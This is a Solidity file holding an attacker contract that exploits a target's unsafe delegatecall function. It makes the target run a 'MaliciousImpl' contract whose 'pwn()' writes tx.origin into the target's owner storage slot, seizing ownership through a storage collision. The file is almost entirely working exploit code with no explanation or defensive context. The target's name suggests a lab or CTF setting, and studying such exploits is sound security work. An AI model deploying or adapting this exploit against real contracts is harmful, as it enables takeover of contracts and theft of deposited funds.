// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

contract MaliciousImpl {
    mapping(address => uint256) private _balances; // slot 0
    address private _owner;                         // slot 1

    function pwn() external {
        _owner = tx.origin;
    }
}

interface IHoneypot {
    function deposit() external payable;
    function delegateExecute(address impl, bytes calldata data) external;
}

contract AttackerDelegatecall {
    IHoneypot     public honeypot;
    MaliciousImpl public malImpl;
    uint256 public slot0;
    uint256 public slot1;

    constructor(address _honeypot) {
        honeypot = IHoneypot(_honeypot);
        malImpl  = new MaliciousImpl();
    }

    function attack() external payable {
        address(this).delegatecall(abi.encodeWithSignature("_manipulate()"));
        address(this).delegatecall(abi.encodeWithSignature("_manipulate()"));

        if (msg.value > 0) {
            honeypot.deposit{value: msg.value}();
        }

        honeypot.delegateExecute(
            address(malImpl),
            abi.encodeWithSignature("pwn()")
        );
    }

    function _manipulate() external {
        slot0 += 1;
        slot1 = slot0 * 0xdeadbeef;
    }
}